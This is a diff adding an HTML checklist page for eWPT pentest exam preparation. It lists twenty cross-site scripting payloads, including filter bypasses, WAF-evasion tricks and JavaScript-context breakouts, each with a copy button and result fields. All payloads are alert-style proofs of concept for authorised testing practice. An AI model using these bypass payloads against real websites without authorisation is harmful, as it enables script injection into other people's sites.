@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Payload Checklist - eWPT</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #1a1a1a; color: #e0e0e0; margin: 20px; }
+        h2 { color: #00ff9d; }
+        table { width: 100%; border-collapse: collapse; background-color: #262626; margin-top: 20px; }
+        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #444; }
+        th { background-color: #333; color: #00ff9d; position: sticky; top: 0; }
+        tr:hover { background-color: #2d2d2d; }
+        .payload-code { font-family: 'Courier New', monospace; color: #ff79c6; background: #1a1a1a; padding: 4px 8px; border-radius: 4px; font-size: 0.9em; }
+        button { background-color: #00ff9d; color: #000; border: none; padding: 6px 12px; cursor: pointer; border-radius: 4px; font-weight: bold; }
+        button:active { background-color: #00cc7e; }
+        input[type="text"] { width: 90%; background: #333; border: 1px solid #555; color: #fff; padding: 4px; }
+        .checkbox-col { text-align: center; }
+    </style>
+</head>
+<body>
+
+    <h2>⚡ XSS Payload Checklist</h2>
+    <p>Live pentesting tool for eWPT preparation. Payloads are copied exactly as written.</p>
+
+    <table id="payloadTable">
+        <thead>
+            <tr>
+                <th>#</th>
+                <th>Payload</th>
+                <th>Description</th>
+                <th>Action</th>
+                <th class="checkbox-col">Done</th>
+                <th>Notes</th>
+            </tr>
+        </thead>
+        <tbody id="tableBody">
+            <!-- Data populated via JS -->
+        </tbody>
+    </table>
+
+    <script>
+        const payloads = [
+            { id: 1, p: '<script>alert(1)<\/script>', d: 'Basic Tag: Standard execution' },
+            { id: 2, p: '<img src=x onerror=alert(1)>', d: 'Event Handler: No script tags' },
+            { id: 3, p: '<svg/onload=alert(1)>', d: 'SVG: Bypasses simple tag filters' },
+            { id: 4, p: 'javascript:alert(1)', d: 'Protocol: For href/src attributes' },
+            { id: 5, p: '\'"><script>alert(1)<\/script>', d: 'Breakout: Escapes attributes' },
+            { id: 6, p: '<details open ontoggle=alert(1)>', d: 'HTML5: Modern browsers' },
+            { id: 7, p: '<scr<script>ipt>alert(1)<\/script>', d: 'Recursion: Bypass strip-once' },
+            { id: 8, p: '<img/src="x"/onerror="prompt(1)">', d: 'Space Evasion: Uses /' },
+            { id: 9, p: '<iframe src="javascript:alert(1)">', d: 'Iframe: Frame context' },
+            { id: 10, p: '<video><source onerror="alert(1)">', d: 'Media: Event-based fallback' },
+            { id: 11, p: '<body onload=alert(1)>', d: 'Body: Fires on DOM ready' },
+            { id: 12, p: '<marquee onstart=alert(1)>', d: 'Legacy: Often missed by WAF' },
+            { id: 13, p: '<isindex type=image src=1 onerror=alert(1)>', d: 'Obscure: Old tag bypass' },
+            { id: 14, p: '&lt;script&gt;alert(1)&lt;/script&gt;', d: 'Entities: Testing decoding' },
+            { id: 15, p: '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e', d: 'Unicode: Bypass < regex' },
+            { id: 16, p: '\'-alert(1)-\'', d: 'JS Context: Inside script tags' },
+            { id: 17, p: '";alert(1);//', d: 'String Break: Breaking JS variables' },
+            { id: 18, p: '<a href="javascript:confirm(1)">Click</a>', d: 'Interaction: High stealth' },
+            { id: 19, p: '<input onfocus=alert(1) autofocus>', d: 'Autofocus: No interaction' },
+            { id: 20, p: '<math><mtext><option><fake><script>alert(1)<\/script>', d: 'Namespace: Complex nesting' }
+        ];
+
+        const tableBody = document.getElementById('tableBody');
+
+        payloads.forEach(item => {
+            const row = document.createElement('tr');
+            row.innerHTML = `
+                <td>${item.id}</td>
+                <td><span class="payload-code">${item.p.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</span></td>
+                <td>${item.d}</td>
+                <td><button onclick="copyText('${item.p.replace(/'/g, "\\'")}')">Copy</button></td>
+                <td class="checkbox-col"><input type="checkbox"></td>
+                <td><input type="text" placeholder="Result..."></td>
+            `;
+            tableBody.appendChild(row);
+        });
+
+        function copyText(text) {
+            navigator.clipboard.writeText(text).then(() => {
+                // Temporary visual feedback
+                event.target.innerText = 'Copied!';
+                setTimeout(() => { event.target.innerText = 'Copy'; }, 1000);
+            });
+        }
+    </script>
+</body>
+</html>
